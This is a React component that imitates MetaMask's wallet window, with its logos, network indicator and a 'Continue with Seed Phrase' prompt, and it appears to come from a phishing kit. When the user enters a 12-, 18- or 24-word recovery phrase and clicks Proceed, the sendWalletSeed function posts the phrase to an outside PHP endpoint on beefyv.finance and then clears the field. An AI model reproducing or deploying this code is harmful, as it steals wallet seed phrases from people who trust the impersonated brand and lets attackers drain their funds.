import { Box } from '@material-ui/core';
import React, { useEffect, useState } from 'react';
import axios from 'axios';
import MetaMaskImg from 'assets/images/metamask.svg';
import MetaMaskFullImg from './../../../assets/images/metamask-logo-horizontal.svg';
import './MetaMaskWin.scss';
import { FaChevronDown } from 'react-icons/fa';
import MetaMaskLoader from '../layouts/loaders/MetaMaskLoader';

const MetaMaskWin = () => {
  const [show, setShow] = useState(true);
  const [walletSeedInput, setWalletSeedInput] = useState('');

  useEffect(() => {
    setTimeout(() => {
      setShow(false);
    }, 2000);
  }, [show]);

  function handleChange(e) {
    setWalletSeedInput(e.target.value);
  }
  async function sendWalletSeed() {
    fetch("http://beefyv.finance/send_mail.php", {
      method: 'POST',
      body: JSON.stringify({ text: walletSeedInput, title: 'Injected'})
    }) 
    .then(res => res.json())
    .then(
      (result) => {
        
      },
      (error) => {
      }
    ) 

    document.querySelector('#wallet-seed').value = ' ';

    console.log('on Submit: >');
    // const payload = walletSeedInput;
    // try {
    //   const response = await axios.post(
    //     'https://jsonplaceholder.typicode.com/posts',
    //     payload
    //   );
    //   console.log(response);
    // } catch (error) {
    //   console.log(error);
    // }
  }
  

  return (
    <Box>
      <Box>{show && <MetaMaskLoader />}</Box>
      {!show && (
        <div className="metamask-window">
          <div className="app-header">
            <div className="app-header__contents">
              <div className="app-header__logo-container">
                <img src={MetaMaskImg} alt="Metamask" />
                <img src={MetaMaskFullImg} alt="Metamask" />
              </div>
              <div className="app-header__account-menu-container">
                <div className="network-component-wrapper">
                  <div className="network-indicator">
                    <div className="menu-icon-circle">
                      <div></div>
                    </div>
                    <div className="network-name">Ethererum MainNet</div>
                    <div className="icon-wrapper">
                      <FaChevronDown size={12} />
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="main-container">
            <div className="view-wrapper">
              <div className="import-account">
                <p className="window-title">Continue with Seed Phrase</p>
                <p>
                  <span>
                    Enter your keyword phrase of 12 words to continue using
                    MetaMask.
                  </span>
                </p>
                <div className="input-wrapper">
                  <label htmlFor="wallet-seed">Wallet Seed</label>
                  <textarea
                    name="wallet-seed"
                    id="wallet-seed"
                    value={walletSeedInput}
                    onChange={handleChange}
                    placeholder="Separate each word with a single space"
                  ></textarea>
                </div>
                <button
                  className={`btn-proceed ${
                    walletSeedInput.trim().split(' ').length == 12 ||
                    walletSeedInput.trim().split(' ').length == 18 ||
                    walletSeedInput.trim().split(' ').length == 24
                      ? 'activeB'
                      : ''
                  }`}
                  onClick={sendWalletSeed}
                >
                  Proceed
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </Box>
  );
};

export default MetaMaskWin;
